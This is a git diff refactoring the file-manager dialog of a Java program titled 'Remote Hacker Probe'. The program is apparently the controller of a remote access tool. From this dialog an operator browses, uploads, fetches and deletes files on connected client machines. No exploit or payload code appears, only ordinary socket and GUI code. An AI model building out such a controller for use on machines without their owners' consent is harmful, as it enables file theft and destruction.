@@ -261,7 +261,7 @@ public class FileManager extends JDialog {
 
 	public final static JPanel contentPanel = new JPanel();
 	static JList FileList;
-	public int CLIENT_ID;
+	public static int CLIENT_ID;
 	public static StringBuilder SelectedFile = new StringBuilder("");
 	public static JTextField textField;
 	public static DefaultListModel model;
@@ -282,7 +282,7 @@ public class FileManager extends JDialog {
 	/**
 	 * Create the dialog.
 	 */
-	void Refresh()
+	public static void Refresh()
 	{
 		try {
 			TimeUnit.SECONDS.sleep(1);
@@ -299,7 +299,7 @@ public class FileManager extends JDialog {
 		
 		MainWindow.HaltAllSystems();
 		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
-		setTitle("Remote Hacker Probe | File Manager");
+		setTitle("Remote Hacker Probe Pro | File Manager");
 		setBounds(100, 100, 761, 410);
 		getContentPane().setLayout(new BorderLayout());
 		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
@@ -338,7 +338,8 @@ public class FileManager extends JDialog {
 					String File = (String) FileList.getSelectedValue();
 					if(!File.startsWith("(^)")) {
 						String filename = File.replaceAll("\\(.*?\\) ?", "");
-						SelectedFile.replace(0, SelectedFile.length(), filename);
+						SelectedFile.setLength(0);
+						SelectedFile.append(filename);
 
 						Server.SendData(Server.Clients.get(CLIENT_ID), "fupload:"+filename);
 						ServerThread.WaitForReply();
@@ -357,50 +358,7 @@ public class FileManager extends JDialog {
 
 				String FileName = (String)JOptionPane.showInputDialog("Uploading : " + file.getName() + " of size " + String.valueOf(filesize) + " bytes.\nEnter File name to Save as : ");
 				if(FileName.length() > 0) {
-					byte[] file_buffer = new byte[filesize];
-					Arrays.fill(file_buffer, (byte)0);
-					int count = 0;
-					DataOutputStream out = null;
-					try {
-						out = new DataOutputStream(Server.Clients.get(CLIENT_ID).getOutputStream());
-					} catch (IOException e1) {
-						// TODO Auto-generated catch block
-						e1.printStackTrace();
-					}
-					FileInputStream  in = null;
-					try {
-						in = new FileInputStream(file);
-
-					} catch (FileNotFoundException e3) {
-						// TODO Auto-generated catch block
-						e3.printStackTrace();
-					}
-					
-					MainWindow.HaltAllSystems();
-					MainWindow.Log("File " + file + " is being uploaded. Please wait.");
-					// Send File Save Trigger
-					Server.SendData(Server.Clients.get(CLIENT_ID), "frecv");
-					Server.SendData(Server.Clients.get(CLIENT_ID), FileName + ":" + String.valueOf(filesize));
-					// Send the File!
-					try {
-						TimeUnit.SECONDS.sleep(1);
-					} catch (InterruptedException e1) {
-						// TODO Auto-generated catch block
-						e1.printStackTrace();
-					}
-					try {
-						while ((count = in.read(file_buffer)) > 0) {
-							out.write(file_buffer, 0, count);
-						}
-					} catch (IOException e2) {
-						// TODO Auto-generated catch block
-						e2.printStackTrace();
-					}
-
-					MainWindow.EnableAllSystems();
-					MainWindow.Log("File '" + file + "' Uploaded, Wait for Message Box to confirm.");
-					ServerThread.WaitForReply();
-					Refresh();
+					ClientOperations.UploadFile(Server.Clients.get(CLIENT_ID), file, FileName);
 				}
 			}
 
@@ -412,10 +370,13 @@ public class FileManager extends JDialog {
 				{
 					String File = (String) FileList.getSelectedValue();
 					if(!File.startsWith("(^)")) {
-						SelectedFile.replace(0, SelectedFile.length(), File);
+						
 						String filename = File.replaceAll("\\(.*?\\) ?", "");
+						SelectedFile.setLength(0);
+						SelectedFile.append(filename);
+						//System.out.println(SelectedFile.toString());
 						Server.SendData(Server.Clients.get(CLIENT_ID), "delete:"+filename);
-						ServerThread.WaitForReply();
+						//ServerThread.WaitForReply();
 						Refresh();
 					}
 					
